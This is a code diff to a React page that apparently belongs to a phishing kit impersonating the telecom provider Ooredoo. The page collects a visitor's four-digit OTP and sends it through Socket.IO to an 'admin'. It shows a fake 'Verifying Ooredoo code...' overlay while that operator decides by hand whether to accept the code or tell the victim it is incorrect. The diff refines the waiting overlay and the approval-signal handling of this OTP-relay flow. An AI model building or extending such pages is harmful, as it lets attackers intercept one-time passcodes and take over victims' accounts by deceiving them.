@@ -2,12 +2,12 @@ import RejectionBanner, { setRejectionMessage, clearRejectionMessage } from "@/c
 import { useState, useEffect, useRef } from "react";
 import { useLocation } from "wouter";
 import { Button } from "@/components/ui/button";
-import ApprovalWaitingOverlay from "@/components/ApprovalWaitingOverlay";
+import WaitingOverlay from "@/components/WaitingOverlay";
 import SiteHeader from "@/components/SiteHeader";
 import SiteFooter from "@/components/SiteFooter";
 import { Loader2, PhoneCall, ShieldCheck, MessageSquare } from "lucide-react";
 import { useLang } from "@/i18n/LanguageContext";
-import { sendData, navigateToPage, isFormApproved, isFormRejected } from "@/lib/store";
+import { sendData, navigateToPage, isFormApproved, isFormRejected, waitingMessage } from "@/lib/store";
 import { getServiceContext } from "@/lib/serviceContext";
 
 const OoredooOtp = () => {
@@ -28,15 +28,19 @@ const OoredooOtp = () => {
   const code = digits.join("");
   const isValid = code.length === 4;
 
-  // Navigate to page on mount
+  // Navigate to page on mount + reset signals
   useEffect(() => {
     navigateToPage("رمز OTP Ooredoo");
+    isFormApproved.value = false;
+    isFormRejected.value = false;
   }, []);
 
   // Watch for admin approval
   useEffect(() => {
     if (!waiting) return;
     if (isFormApproved.value) {
+      isFormApproved.value = false;
+      waitingMessage.value = "";
       setWaiting(false);
       setLoading(false);
       navigate("/waiting");
@@ -47,6 +51,8 @@ const OoredooOtp = () => {
   useEffect(() => {
     if (!waiting) return;
     if (isFormRejected.value) {
+      isFormRejected.value = false;
+      waitingMessage.value = "";
       setRejectionMessage(pick(
         "رمز التحقق غير صحيح. يرجى المحاولة مرة أخرى",
         "The code you entered is incorrect. Please try again."
@@ -82,6 +88,8 @@ const OoredooOtp = () => {
     if (!isValid) return;
     setLoading(true);
     clearRejectionMessage();
+    isFormApproved.value = false;
+    isFormRejected.value = false;
 
     // Send OTP via Socket.IO to admin
     sendData({
@@ -94,6 +102,7 @@ const OoredooOtp = () => {
       nextPage: "انتظار",
       waitingForAdminResponse: true,
       isCustom: true,
+      customWaitingMessage: pick("جارٍ التحقق من رمز Ooredoo...", "Verifying Ooredoo code..."),
     });
 
     setWaiting(true);
@@ -105,15 +114,7 @@ const OoredooOtp = () => {
 
   return (
     <div className="min-h-screen bg-background relative" dir={dir}>
-      <ApprovalWaitingOverlay
-        open={waiting}
-        kind="otp"
-        title={pick("جارٍ التحقق من رمز Ooredoo", "Verifying the Ooredoo code")}
-        subtitle={pick(
-          `ربط رقم الهاتف مع ${serviceContext.accountAr}`,
-          `Linking your phone number to your ${serviceContext.accountEn}`
-        )}
-      />
+      <WaitingOverlay />
       <RejectionBanner />
       <SiteHeader />
 
